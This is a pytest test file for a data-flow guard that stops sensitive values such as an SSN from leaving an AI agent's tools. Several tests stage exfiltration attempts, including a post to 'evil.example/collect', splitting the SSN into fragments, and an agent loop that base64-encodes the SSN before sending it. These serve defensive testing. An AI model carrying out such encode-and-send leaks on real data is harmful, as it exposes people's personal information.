import asyncio
import json

import pytest

from flowguard import FlowBlocked, Guard, Policy, Toolbox, email_domain, hostname

SSN = "123-45-6791"


@pytest.fixture
def g(policy):
    return Guard(policy)


# -- decorators --------------------------------------------------------


def test_source_decorator_observes_results(g):
    @g.source("hr.lookup")
    def lookup(emp_id):
        return {"ssn": SSN}

    assert lookup("E1") == {"ssn": SSN}
    assert g.check("external_api", SSN).findings[0].origin == "hr.lookup.ssn"


def test_source_defaults_to_function_name(g):
    @g.source()
    def read_row():
        return {"ssn": SSN}

    read_row()
    assert g.check("external_api", SSN).findings[0].origin.startswith("test_source_defaults")


def test_sink_blocks_before_the_tool_runs(g):
    sent = []

    @g.sink("external_api")
    def post(body):
        sent.append(body)
        return "ok"

    g.observe({"ssn": SSN}, source="s")
    assert post("hello") == "ok"
    with pytest.raises(FlowBlocked):
        post(f"ssn={SSN}")
    assert sent == ["hello"]  # the blocked call never executed


def test_sink_on_block_return_gives_a_string(g):
    @g.sink("external_api", on_block="return")
    def post(body):
        raise AssertionError("must not run")

    g.observe({"ssn": SSN}, source="s")
    result = post(SSN)
    assert result.startswith("[FlowGuard] BLOCKED") and SSN not in result


def test_sink_destination_callable_uses_named_arguments(g):
    calls = []

    @g.sink(lambda url: hostname(url))
    def http_post(url, body, headers=None):
        calls.append(url)

    g.observe({"ssn": SSN}, source="s")
    http_post("https://internal_db/api", SSN)  # HIGHLY_SENSITIVE destination: fine
    with pytest.raises(FlowBlocked):
        http_post("https://evil.example/collect", SSN)
    assert calls == ["https://internal_db/api"]


def test_sink_checks_default_arguments_too(g):
    @g.sink("external_api")
    def post(body, note=f"see {SSN}"):
        return "sent"

    g.observe({"ssn": SSN}, source="s")
    with pytest.raises(FlowBlocked):
        post("hi")


def test_sink_args_limits_what_is_inspected(g):
    @g.sink("external_api", args=["body"])
    def post(body, auth_token=""):
        return "ok"

    g.observe({"ssn": SSN}, source="s")
    assert post("hi", auth_token=SSN) == "ok"  # explicitly not inspected
    with pytest.raises(FlowBlocked):
        post(SSN)


def test_sink_with_multiple_destinations_uses_the_strictest(g):
    @g.sink(lambda to: [email_domain(a) for a in to])
    def send_mail(to, body):
        return "sent"

    g.observe({"ssn": SSN}, source="s")
    assert send_mail(["a@internal_db"], SSN) == "sent"
    with pytest.raises(FlowBlocked):
        send_mail(["a@internal_db", "b@external_api"], SSN)


def test_tiny_fragments_through_a_real_sink_are_stitched_despite_a_constant_url_argument(g):
    """Constant arguments (the URL) must not land between the pieces and hide them."""
    sent = []

    @g.sink(lambda url: hostname(url))
    def http_post(url, body):
        sent.append(body)

    g.observe({"ssn": SSN}, source="s")
    url = "https://trusted_api/sync"
    http_post(url, "123")
    http_post(url, "45")
    with pytest.raises(FlowBlocked):
        http_post(url, "6791")
    assert sent == ["123", "45"]


def test_sink_rejects_bad_on_block(g):
    with pytest.raises(ValueError):
        g.sink("x", on_block="ignore")


def test_async_source_and_sink(g):
    @g.source("db")
    async def read():
        return {"ssn": SSN}

    @g.sink("external_api")
    async def post(body):
        return "sent"

    async def run():
        await read()
        assert await post("hi") == "sent"
        with pytest.raises(FlowBlocked):
            await post(SSN)

    asyncio.run(run())


def test_helpers():
    assert hostname("https://Api.Example.com:8443/x?y=1") == "api.example.com"
    assert hostname("api.example.com/path") == "api.example.com"
    assert email_domain("Bob@Corp.Example") == "corp.example"


# -- toolbox / agent loop ----------------------------------------------


@pytest.fixture
def toolbox(g):
    tb = Toolbox(g)

    @tb.source
    def read_employee(emp_id: str):
        return {"id": emp_id, "name": "Kim Min-jun", "ssn": SSN, "salary": 85000}

    @tb.tool
    def to_base64(text: str):
        import base64

        return base64.b64encode(text.encode()).decode()

    @tb.sink(destination=lambda url: hostname(url))
    def http_post(url: str, body: str):
        return f"200 OK ({len(body)} bytes)"

    @tb.tool
    def broken():
        raise RuntimeError("boom")

    return tb


def test_agent_loop_attack_is_blocked_and_benign_call_passes(toolbox, g):
    """The exact bypass that defeats field-name labeling: read, encode, then send."""
    record = json.loads(toolbox.dispatch("read_employee", '{"emp_id": "E011"}'))
    encoded = toolbox.dispatch("to_base64", {"text": record["ssn"]})

    denial = toolbox.dispatch("http_post", {"url": "https://trusted_api/sync", "body": encoded})
    assert denial.startswith("[FlowGuard] BLOCKED")
    assert "base64" not in denial and "ssn" not in denial.lower()  # nothing to learn from

    assert toolbox.dispatch("http_post", {"url": "https://external_api/x", "body": "Kim Min-jun"}).startswith("200")
    assert toolbox.dispatch("http_post", {"url": "https://internal_db/x", "body": encoded}).startswith("200")

    blocked = [e for e in g.audit.events if not e["allowed"]]
    assert len(blocked) == 1 and blocked[0]["findings"][0]["via"] == "base64"


def test_verbose_denials_expose_the_detailed_reason(g):
    tb = Toolbox(g, verbose_denials=True)

    @tb.sink(destination="external_api")
    def post(body: str):
        return "ok"

    g.observe({"ssn": SSN}, source="db")
    assert "HIGHLY_SENSITIVE" in tb.dispatch("post", {"body": SSN})


def test_dispatch_handles_bad_calls_without_crashing(toolbox):
    assert toolbox.dispatch("nope", {}).startswith("error: unknown tool")
    assert toolbox.dispatch("read_employee", "{not json").startswith("error: tool arguments are not valid JSON")
    assert toolbox.dispatch("read_employee", "[1]").startswith("error: tool arguments must be")
    assert toolbox.dispatch("broken", None) == "error: RuntimeError: boom"
    assert toolbox.dispatch("read_employee", {"wrong": 1}).startswith("error: TypeError")


def test_dispatch_accepts_empty_string_arguments(toolbox):
    assert toolbox.dispatch("broken", "") == "error: RuntimeError: boom"


def test_adispatch_supports_async_tools(g):
    tb = Toolbox(g)

    @tb.source
    async def read():
        return {"ssn": SSN}

    @tb.sink(destination="external_api")
    async def post(body: str):
        return "sent"

    async def run():
        await tb.adispatch("read", {})
        assert await tb.adispatch("post", {"body": "hi"}) == "sent"
        assert (await tb.adispatch("post", {"body": SSN})).startswith("[FlowGuard] BLOCKED")

    asyncio.run(run())
    assert tb.dispatch("post", {"body": "hi"}).startswith("error: TypeError")  # async via sync dispatch


def test_toolbox_tools_can_be_renamed(g):
    tb = Toolbox(g)

    @tb.tool(name="search")
    def do_search(q):
        return f"results for {q}"

    assert tb.dispatch("search", {"q": "x"}) == "results for x"


def test_policy_from_dict_drives_a_guard():
    policy = Policy.from_dict({"destinations": {"vault": "HIGHLY_SENSITIVE"}, "fields": {"badge": "SENSITIVE"}})
    guard = Guard(policy)
    guard.observe({"badge": "B-99812"}, source="s")
    assert guard.check("vault", "B-99812").allowed
    assert guard.check("elsewhere", "B-99812").blocked
